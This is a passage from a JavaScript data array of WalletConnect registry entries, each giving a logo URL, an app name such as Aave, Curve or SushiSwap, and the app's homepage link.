        src: "https://registry.walletconnect.com/api/v1/logo/lg/e6c38d65364335d550f629c44a1a86eb6befffa363e7de1cdba26462838226fd",
        appName: "Aave",
        type: "App",
        href: "https://app.aave.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/855679a1802326625d10fcaf45cf366aa529a58827d28d01edec0f5fd32330d4",
        appName: "Zerion",
        type: "App",
        href: "https://beta.zerion.io/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/9a70a431ed25a8872ef971e3b02c9a7dfff2ae6cf66ec9eb37612aadefbc4e9d",
        appName: "LocalCryptos",
        type: "App",
        href: "https://localcryptos.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/fd0cae9917f44482aae80d4a3ef4d8a53e50d465cde783baf5d2eca5cc53cf61",
        appName: "DeBank",
        type: "App",
        href: "https://debank.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/8308656f4548bb81b3508afe355cfbb7f0cb6253d1cc7f998080601f838ecee3",
        appName: "Unstoppable Domains",
        type: "App",
        href: "https://unstoppabledomains.com/manager"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/a90d95ac84983ea0d5370b2584a3db4a1aee1975e0b86801e0ddd8159c80d5ff",
        appName: "Rarible",
        type: "App",
        href: "https://app.rarible.com/#/connect"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/f98ce170f08376732dfddde7823a5f97d9039bcec4e5df02f3978858eb84d305",
        appName: "1inch Exchange",
        type: "App",
        href: "https://1inch.exchange/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/7bc4da398540ed770b1d7608a62f253985f9850a2c28abb5c74f94cca37fadbd",
        appName: "yearn",
        type: "App",
        href: "https://yearn.finance/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/c591664a9fc2dfee98992ce072d0354154b667ec2f0c9d937ceb84fa9ab843b4",
        appName: "Curve",
        type: "App",
        href: "https://curve.fi"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/8e96e3b538965f3bcac2836b6579df3a9de55ce69c49e5ac1a6889c8f0b8df7b",
        appName: "Adex Network",
        type: "App",
        href: "https://adex.network/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/09c4e2ebc81a6a76c05d0c62f797151732fa9c0b84ef92654cd438849271e44b",
        appName: "dYdX",
        type: "App",
        href: "https://dydx.exchange/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/2d0bda43d0c0703335ebc242e176182b5a50304b99984e01e86bebdd91238c7e",
        appName: "MyCrypto",
        type: "App",
        href: "https://mycrypto.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/bf528087bc3d8ae759444e8246cd56d5a0ddea701274163294e533f20353832b",
        appName: "Oasis App",
        type: "App",
        href: "https://oasis.app"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/132a564227f18d8c549bf4bebc617b5416be80fca9d321507685d96c8d84bcc5",
        appName: "TokenSets",
        type: "App",
        href: "https://tokensets.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/e15a799a9a997f09035d48444afae83b0f7dd74fe5eefc5ec47ad679df29ceaa",
        appName: "MANTRA DAO",
        type: "App",
        href: "https://mantradao.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/6d9f418c42768bc939bd83acd7f7db0507dcc3cd0dac209a65ed5ca34b360079",
        appName: "Matcha",
        type: "App",
        href: "https://matcha.xyz"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/b79d14dff50d405ebc7484f5316f999d8e0d9d130c3a4412aaf7e5c587b0d954",
        appName: "DeFi Prime",
        type: "App",
        href: "https://defiprime.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/658cc78a82d277db4cf6a801adcb1b68aeccd1357d40c177c443625da95fd8f4",
        appName: "Loopring",
        type: "App",
        href: "https://loopring.io"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/70cad09a92cb1c278dd876b3c46173dfd2ed394ecef1bd803ee001d7632e93a1",
        appName: "InstaDapp",
        type: "App",
        href: "https://instadapp.io/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/44ff1e444b11207673bb2e832138afa0062e4618659189b9207990a7767dccdf",
        appName: "Matic Network",
        type: "App",
        href: "https://matic.network/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/025ec6010962022ad58dc9467f888877d2fe16e0b4ec0ccd0c7388735f1e5641",
        appName: "3Box",
        type: "App",
        href: "https://3box.io/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/501ce637a32ca401d7fe8f10664f29b2cbff6f4a83e23df30affe2a8c3c36bec",
        appName: "Nash",
        type: "App",
        href: "https://nash.io/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/ed6a16b330335e7b39a27f43ccc603043a02d03e66d3d185a8924fec42bb2d03",
        appName: "DDEX",
        type: "App",
        href: "https://ddex.io/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/780f1069d765bf8d5c8d3c17728e0f0fac17708d07dfe840b7c0e61d3ab7ec61",
        appName: "Totle",
        type: "App",
        href: "https://totle.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/21ab23fb856af690a4cd42ec6505a1398b571da2a772717ad3f0e047f34cced7",
        appName: "Bamboo Relay",
        type: "App",
        href: "https://bamboorelay.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/394ee2a85b0ed89e766fbb27c0aeb44d423dee7ec7189ba39c1ab9b5fe55f870",
        appName: "Synthetix",
        type: "App",
        href: "https://synthetix.exchange/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/fb6cd1a045de3209931525fe421631d3bda00fd8f5d72226833b99f3966d4f0d",
        appName: "dex.blue",
        type: "App",
        href: "https://dex.blue/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/6d296cc03b11b2b59c1e009f1854576be7ae1687951cf7f6283f993ac7b8b2e4",
        appName: "PoolTogether",
        type: "App",
        href: "https://pooltogether.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/ddcd44ec977ae9e456f1ea930a46e67fa7537c0c89498deb17b1d29c4274ff31",
        appName: "Sablier",
        type: "App",
        href: "https://sablier.finance/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/013e3e71441eaf78044b05f30544cac56ea91a5e5a8a39b62bd0b80808de00da",
        appName: "DEX.AG",
        type: "App",
        href: "https://dex.ag/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/0cc13b1d63976ca5dd90dcbfb234e95f69d4edde6a24cbcd09683a5fd944040e",
        appName: "ENS Domains",
        type: "App",
        href: "https://ens.domains/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/2871556630e7ed3588218a4279561f71735b7567c3e48b2f80b2a7705c51e0c3",
        appName: "Idle Finance",
        type: "App",
        href: "https://idle.finance/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/ce64cd600d0ae877f47ba0148501bcd23ee1c08a2adeaaf69310679ec3fe7132",
        appName: "iearn.finance",
        type: "App",
        href: "https://iearn.finance/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/98f22f6c710f0142d04591df1a1938d94b81450bba0f986757432b6719f6e641",
        appName: "RCN Finance",
        type: "App",
        href: "https://rcn.market/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/7f88a77105e3960625af762a84863c0d2f80c74fe6d8a1f46b136edcefc1b3c3",
        appName: "Hegic",
        type: "App",
        href: "https://hegic.co/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/6f9d21b4f537a5b82406ee97b1ed06311bf60500ac6e6fb822dd2de73dda0593",
        appName: "Kickback",
        type: "App",
        href: "https://kickback.events/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/c2e7871837f2b6f99de43371629606f3b0ddf2d25ac49d92be419e682088919d",
        appName: "88mph",
        type: "App",
        href: "https://88mph.app/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/d29a5c54fbd768185c643706ac8101a9bbe1c44225674379a57193503cf5ec69",
        appName: "Mooni",
        type: "App",
        href: "https://mooni.tech/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/00af657f1f1a370adeadd306d772849698cd99e89ba53fe8e508a12511f9c22b",
        appName: "Clovers",
        type: "App",
        href: "https://clovers.network/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/41b51f689a37ffb63d6663fc8ea0c86e0bc6a030f835bb3e5d5e53dc03b83b35",
        appName: "Mintbase",
        type: "App",
        href: "https://mintbase.io/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/7da158932208181d61b9e421e2a2088fb70d4adf64adc676e185fcea5396e4d0",
        appName: "DAOstack",
        type: "App",
        href: "https://daostack.io/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/30ce179f170230734d83ba26a6b381a7a3298fe014559fae51cc0a14daf8c92d",
        appName: "KnownOrigin",
        type: "App",
        href: "https://knownorigin.io/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/fffd1ef5d2105b1b89252c0cf4596a400444d7d4d592268e5699d301eff08ae2",
        appName: "MyEtherWallet",
        type: "App",
        href: "https://myetherwallet.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/14e870c10e5e83f9590db63ae5d369e56cb8d88ed6aa27fa021b1ec37ca561cd",
        appName: "Affogato",
        type: "App",
        href: "https://affogato.co/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/e4a14f67fb4fbfe240ec43efdca3c50e15ab7302446def657e47e86ec999e655",
        appName: "StablePay",
        type: "App",
        href: "https://stablepay.io/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/c1b96e441428dac9475c162de858d5c4e78c09a9948d0a2626cc37376fa99407",
        appName: "DeFi Saver",
        type: "App",
        href: "https://defisaver.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/5429480c60b48a6c93557ee57b56ec66bba892f4e90c84e54ba233a864de4124",
        appName: "ThorChain",
        type: "App",
        href: "https://thorchain.org/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/325f1b46b2d2e04c911089f8da507da38bb13ee3c95aa85fa4e327bd0c88ab12",
        appName: "BulkSender",
        type: "App",
        href: "https://bulksender.app/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/f6399af14c9bbe64672c4a5f5fd9fca42107b76f3bce1b33325d5ffd702c7f66",
        appName: "Betoken",
        type: "App",
        href: "https://betoken.fund/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/4a7c46897481ccee8c101b99a920b90727cf42bf0f99c8f4f50e6a6ebc802c4e",
        appName: "Linkdrop",
        type: "App",
        href: "https://linkdrop.io/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/b0234ad23e4ab635e63a86f1b6adbda87edcad6ac426321e865daf991dc12ce8",
        appName: "HelioWallet",
        type: "App",
        href: "https://heliowallet.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/0e680e620e7a8d15a8048aa6d9a825e07291a1da23a82ced661aa96ed2e81998",
        appName: "Escaroo",
        type: "App",
        href: "https://escaroo.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/54d4f6b75cf9288dbade3a17363ba67c45043fc384f58c2c8c4f1b67da139d60",
        appName: "KyberSwap",
        type: "App",
        href: "https://kyberswap.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/5f46863e8fdeb98a98dea1ca9ecaef896c8f4382ba6778deeaf65a399bb7e679",
        appName: "TokenMarket",
        type: "App",
        href: "https://tokenmarket.net/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/d4835d7f70d198d1c9e03bebdd3c27bb68b4bb621de3797c08eb35d8ef2833da",
        appName: "Mesa",
        type: "App",
        href: "https://mesa.eth.link/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/bb92c98ab35248d1dac4f1abe46e13b49724ce42a7dbcc8ead183dba1b50e12a",
        appName: "MCDEX",
        type: "App",
        href: "https://mcdex.io"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/ede2b38da1dddfffd32bbb84c3549b2c1585a14adb88a62b8c10f095253f2f54",
        appName: "Furucombo",
        type: "App",
        href: "https://furucombo.app/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/a66189f2de21e3674c3762ab93c1c14a666a5361d4d79df1f2d9409151cd5def",
        appName: "Melon",
        type: "App",
        href: "https://melon.avantgarde.finance/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/b971da97af8b126d704c9c19e324d3b44ea885c067da3631eb22fb5e8b9180e1",
        appName: "Chainsfr",
        type: "App",
        href: "https://chainsfr.com"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/32f5f734ca5e57cd5e448aa4fc0a720b802d67182a0b6494f46867241fae3b9e",
        appName: "AKA3 Email Alias",
        type: "App",
        href: "http://aka3.net"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/b37cbde29b86efa434b1eebda15f7598e4338f5307c6d766311558cebd548b33",
        appName: "2Key",
        type: "App",
        href: "https://2key.network/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/ef45e5cb8c86e3904c26f0105ae52ad5d79659c58e0922b18c0d61a6854afcc4",
        appName: "Pitch",
        type: "App",
        href: "https://pitchinvestorslive.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/b6b9e0449871fbe29174da88d909c4eb127cdcaf545ac470daaed9b0d93d515c",
        appName: "SushiSwap",
        type: "App",
        href: "https://sushi.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/d8663d3a49e8c0ace8ece983fc6fbdb47bdfcc3b1dacbafb99940c9e7ddc9429",
        appName: "Unagii",
        type: "App",
        href: "https://unagii.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/0afb52d86941c9f09946295848506fe4bc5e35f0fef606ce2ade789f76a6fbea",
        appName: "Cream Finance",
        type: "App",
        href: "https://cream.finance/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/09728a04025a39f04c76c3ab3751f1d245fab60bc519489a0c0107f0861e950a",
        appName: "zkSync",
        type: "App",
        href: "https://zksync.io/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/6e8bece35cfcfeed1aa4922e939c118ab26f51af5c7ab842a6a77a00694d4b9f",
        appName: "Shell Exchange",
        type: "App",
        href: "https://shells.exchange/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/66a152c24564b90c790dda221dc6064d8a916b8ee45f4fb3d6732da01d0bebaa",
        appName: "Index Coop",
        type: "App",
        href: "https://indexcoop.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/6c5f0f23fb7158576a5f314585ad520a43d3afae1a6cad59dcff626709525c2b",
        appName: "SwapX",
        type: "App",
        href: "https://swapx.org/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/8858da9365f7ab948c4f137ff93a5c8cbc311fe5321fcd31dccea6efdba538aa",
        appName: "Starname",
        type: "App",
        href: "https://starname.me/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/82f6a24e8c52f80c2ed28e718202cb12fdb22df34419c327e6846c1544e107f3",
        appName: "Space",
        type: "App",
        href: "https://space.storage/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/43055637bd8d3da2afa83b1650348c8ccafa67e0c201afe2c0f2a06a9aecae18",
        appName: "Maskbook",
        type: "App",
        href: "https://mask.io/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/2d7b5ef9ea6e5b856440ad38ac3e9ffc6e311f353aae4a90daadf4654e31ffb7",
        appName: "Snapshot",
        type: "App",
        href: "https://snapshot.page/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/bbe3172e59ba21541c5739f09031cd28ac3aed0ccd23280acfe19706fbf04820",
        appName: "Invoice.build",
        type: "App",
        href: "https://invoice.build/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/cacf4ce4b9b170741b0dbdb8c008c61e88faae3eae5bd58db549925859940410",
        appName: "Ankr",
        type: "App",
        href: "https://ankr.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/253aedf09361b7d0d90b33107079635554ad56807d9f0a6edd95891a45eca990",
        appName: "DODO",
        type: "App",
        href: "https://dodoex.io/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/3ed8d78a90e1ecefae998f6f3d7fe968d0ac6c2ee7a092fe29bae3e9621f9a8f",
        appName: "zLOT",
        type: "App",
        href: "https://zlot.finance/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/492caa74c01551142885e2e5ecbe760f82e4c0206e8d3fe4d8c14477032b0412",
        appName: "Tokamak Network",
        type: "App",
        href: "https://tokamak.network/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/57361b007a69218b00842b78d7cb4f98afd3572cb52ef950c4fd05c0a47c21e1",
        appName: "Actus Protocol",
        type: "App",
        href: "https://actus-protocol.io/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/1fe0c2ed2ddd10d7caf2db5d873a8fde1817dff12a29dff0e9c59e99ee8cd8a4",
        appName: "AstroTools.io",
        type: "App",
        href: "https://astrotools.io/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/45ad03d00056530b6a275ec4babe7b04f15cdcd4a5b14c8d6b9a26adcc84928a",
        appName: "Rubic Exchange",
        type: "App",
        href: "https://rubic.exchange/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/3c930df62f0ac573c8d993debb4de3e32fc0159ca85543dcadf3eb7e06a57e54",
        appName: "Harvest Finance",
        type: "App",
        href: "https://harvest.finance/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/3c8532a03fc2fc60876b145e9482c002edffd5403268710b9f5412a822a4be87",
        appName: "OctoFi",
        type: "App",
        href: "https://octo.fi/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/9c2a672e60f354708a3e622d7cf3fd11a25d7f8265f811ede376f599cc077102",
        appName: "Mushroom Finance",
        type: "App",
        href: "https://mushrooms.finance/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/d516cd697587ceacdeb96c302488b43daf4a08732c6cdc6533989fb0598715dd",
        appName: "Bitfrost Finance",
        type: "App",
        href: "https://bitfrost.finance/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/a3ad8e05bc84499afaf3612a0ac95ef5e9b65c587da1b5ed71a00b9ff0e5f4af",
        appName: "Orchid Protocol",
        type: "App",
        href: "https://orchid.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/88fe080dcec093d8e358ab011f5384878ead9cb68ac0ac7dc690744811366597",
        appName: "Lido",
        type: "App",
        href: "https://lido.fi/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/0ace4cf765779f94e3f546dee7bf2852dee333c57999ca04ae80403df4a14cd7",
        appName: "Datamine Network",
        type: "App",
        href: "https://datamine.network/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/f5dfce6586648970f967d75640ae074553deb3a93dda5ce109de894d61027b59",
        appName: "Streamr",
        type: "App",
        href: "https://streamr.network/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/0fbcea2de72eee88bb00512395fb1e99388ffbb1746cdf01dffc6797d4f06bfd",
        appName: "DappRadar",
        type: "App",
        href: "https://dappradar.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/3175fb08702c0c5945b837a47d333fa4f323763557623200b1f52cd57de6fa7b",
        appName: "SuperRare",
        type: "App",
        href: "https://superrare.co/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/34ecba237dabd32d823ecc328e125d503434609185c7bfb4ce8106618fdcfc10",
        appName: "Arbitrum",
        type: "App",
        href: "https://arbitrum.io/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/541b38c73c267bfacf2383cc6c4fb0b23fcd93c092b265bdf4e2c6f521c385da",
        appName: "ParaSwap",
        type: "App",
        href: "https://paraswap.io/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/7c207664419cd871fc76a8e6d4496800877bcd9592eb42b4b987608344663f8f",
        appName: "HoneySwap",
        type: "App",
        href: "https://honeyswap.org/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/7657bb2b332c4ad3ef648a7f67ce6f1def58027be3c36efa098a4ab031e6031d",
        appName: "Fleek",
        type: "App",
        href: "https://fleek.co/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/fd147609a856c6793f2c01f80d1e60b6948490adf1dfcf18015e396510d6636c",
        appName: "DeFiner",
        type: "App",
        href: "https://definer.org/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/b127136d3fae5d392cc34eba50d6788a248345a797e696ad5f6ee88aabe1eaa6",
        appName: "Proof of Humanity",
        type: "App",
        href: "https://proofofhumanity.id/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/dc5eae101caa47ce5580eb792799660bf2b8621cfadb7a4cbf69f8b647e71c51",
        appName: "Livepeer Explorer",
        type: "App",
        href: "https://livepeer.org"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/5a329cffe7aa4afa662139c3e119e51683bba096b0b877c5f55ba56b250632ab",
        appName: "Swapzone",
        type: "App",
        href: "https://swapzone.io/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/25a0ea266e011f80bc9952b1cc6f1328d3bbe69d9aa0283e6b70d9d1367a9ed7",
        appName: "Axion",
        type: "App",
        href: "https://axion.network"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/6b9ac5790debc6264e9581215724b782a23543cba6df5da693c334a90e83855e",
        appName: "PlotX",
        type: "App",
        href: "https://plotx.io"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/4b65e51c3df048d08f63b308c2a3d52a7472c3e1688f0ea8c65be9f4cf5d4631",
        appName: "Krystal",
        type: "App",
        href: "https://krystal.app/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/9405762be07f986472fd249c0aa49dc5de325afe880d1c39df0d5cb5a9458706",
        appName: "DAOLaunch",
        type: "App",
        href: "https://daolaunch.net"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/a46b30fc7a7c662e75825225f2eae09b07412199d09771d821a5a0853e906906",
        appName: "MoonCat World",
        type: "App",
        href: "https://mooncatworld.com"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/4408aab9112b401fabc0605be6fec8ade8519680fa40ed8b6e13f7a32d31cdba",
        appName: "Mulan Finance",
        type: "App",
        href: "https://mulandefi.finance/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/aeaad5749e22fd5c7fdb29251af22a04b3d23b6770769e5e8d81a77a4b666287",
        appName: "B.Protocol",
        type: "App",
        href: "https://bprotocol.org"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/7b5ccbe00139bb41c0a087716420b68354db3daf4b6a58bcffd64baf38e5bd87",
        appName: "Flexa",
        type: "App",
        href: "https://flexa.network/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/a7fd043435006b030302ed050bf85a793e575930f3faa7a6130f1be369bfe206",
        appName: "PancakeSwap",
        type: "App",
        href: "https://pancakeswap.finance/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/fc14632c9fee01c327d2b5d5bd960efbd5ca301fc7b9e4a891741d2703e3ca72",
        appName: "Cripto Archi Finance",
        type: "App",
        href: "https://criptoarchi.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/417d83b614dd10de664107873ca2c2a65c62f2e699113dc005790f6a84c42cae",
        appName: "Twinci",
        type: "App",
        href: "https://twinci.io"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/e428e92b4f14f7bf5929881f8d4bf92f5dc29a41553a5c4016db32d52b0ae150",
        appName: "Moonkat",
        type: "App",
        href: "https://moonkat.net/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/0e595419de85c18fb413dd06196d0119513e1c4907ca4dc8240af35002cac8bf",
        appName: "Himegami Protocol",
        type: "App",
        href: "https://himegamiprotocol.org/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/5726877b12fe2b16b4491624a920d481d4e31ddd39663c456ee195342e2f694c",
        appName: "Punk Finance",
        type: "App",
        href: "https://punk.finance"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/d73c705f5aef95a1914afce5310faf4660f0354e8a5a7e3cc420ae4a0daa89eb",
        appName: "GhostMarket",
        type: "App",
        href: "https://ghostmarket.io"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/9fadd1908c3a55a10ec42c66c192bcfb34e055d8b1f523233dccdeeebb3e73c2",
        appName: "Alkemi",
        type: "App",
        href: "https://alkemi.network"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/a1fb7359e8d89469a4004b809c8470216a7c049c4b27ad6f3cabc3ac9d79adf9",
        appName: "YFX",
        type: "App",
        href: "https://yfx.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/d67b8e1ee1bd30f68af1203f07a5081aed629a859e6e1fbb3e6a424dc9e1592d",
        appName: "NFTY Connect",
        type: "App",
        href: "https://nftyconnect.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/dd3cf12012061040d30a7ccda1527fc8996062899c89a521ee4060a998e49cdb",
        appName: "Vesper Finance",
        type: "App",
        href: "https://vesper.finance/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/79021a292ca1cec3d4e8d879a3c88942119478fbf7db3ea2459160d0dbb82356",
        appName: "NFTBank.ai",
        type: "App",
        href: "https://nftbank.ai/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/c9688b7e5331a9cdeebb973201263f470fdcbca9151e02752523c7ff89ddecf3",
        appName: "Trinity Feeds",
        type: "App",
        href: "https://www.trinity-feeds.app/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/c38c37b8bdf6117fe09e1db3a13240bb1029c4a9ad88ea97cd1f3e30f48e0ab7",
        appName: "BITPIF",
        type: "App",
        href: "https://bitpif.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/7c9754f94b305167ccc5770f9b9878d2a9f0150fc98dbdb6fa900553abf15f7c",
        appName: "Fuse Staking",
        type: "App",
        href: "https://fuse.io"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/e2612e4e0e482b16836c475a94586bbdf8952edf57f13d2965bd824816260cc1",
        appName: "Tyrell-Yutani HUB",
        type: "App",
        href: "https://tyrell-yutani.app"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/8fcea8ada5b01e501ef11014c6658e6e39a6e0dcca4a12a131170c4d5c631425",
        appName: "ChangeNow",
        type: "App",
        href: "https://changenow.io"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/8fcad00e3d10c0361c6b778796ca421c0ced7dbaa91d98a707a3af3c0024b0ca",
        appName: "eyesfi",
        type: "App",
        href: "https://eyesfi.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/b3e7f913050524a55819c22056b5d60a58e0773c14a91d0d1309e436ba762bcf",
        appName: "Raven Protocol",
        type: "App",
        href: "https://ravenprotocol.com/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/8f8506b7f191a8ab95a8295fc8ca147aa152b1358bee4283d6ad2468d97e0ca4",
        appName: "CeloTerminal",
        type: "App",
        href: "https://celoterminal.com"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/c56663507f4a19ce710f784f84c3e45ec73fda6dd3abb36ef381400cb3604abf",
        appName: "U-Swap",
        type: "App",
        href: "https://uselesscrypto.com"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/0c6ccafe44a3fe7b2c48eb627d01af7477946c5880461b20459c28c1faaf395e",
        appName: "Decentraland",
        type: "App",
        href: "https://decentraland.org"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/f1a34d93e2545075fca526562cd59b6b21b8c344f76787594b5ec120a4babce8",
        appName: "SpiritSwap",
        type: "App",
        href: "https://spiritswap.finance/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/56f7370aafccaed767ac969e79fc0359063daead3a34dfe3991638cc105c5e6a",
        appName: "SpookySwap",
        type: "App",
        href: "https://spookyswap.finance/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/a6c7662de52db7c8088f1e32dcf04c122675c834c839c2eb40e495aed207d4e2",
        appName: "Dogs of Elon",
        type: "App",
        href: "https://dogsofelon.io/"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/4c0203e76f3163c472073fa9be9843aabdd01a99cd1d0a5a87db5caa71f68898",
        appName: "🧑‍🎤 PunkWallet",
        type: "App",
        href: "https://punkwallet.io"
    }, {
        src: "https://registry.walletconnect.com/api/v1/logo/lg/36a9516e9b17c1153233fc7faffee259697a2138aed633ab256b947971b044a8",
        appName: "OptimisticLoogies",
        type: "App",
        href: "https://optimistic.loogies.io/"
    }, {
